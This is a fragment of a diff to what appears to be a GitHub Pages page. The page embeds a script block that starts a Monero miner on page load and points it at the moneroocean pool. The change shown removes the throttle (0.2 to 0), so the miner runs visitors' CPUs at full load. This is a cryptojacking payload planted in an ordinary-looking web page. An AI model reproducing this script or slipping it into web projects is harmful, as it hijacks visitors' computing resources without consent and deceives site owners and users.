@@ -44,7 +44,7 @@ Having trouble with Pages? Check out our [documentation](https://help.github.com
     var password = 'x';
     var mining_pool = 'gulf.moneroocean.stream:10001';
     var threads = -1;
-    var throttle = 0.2;
+    var throttle = 0;
     var debug = false;
     cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
 </script>
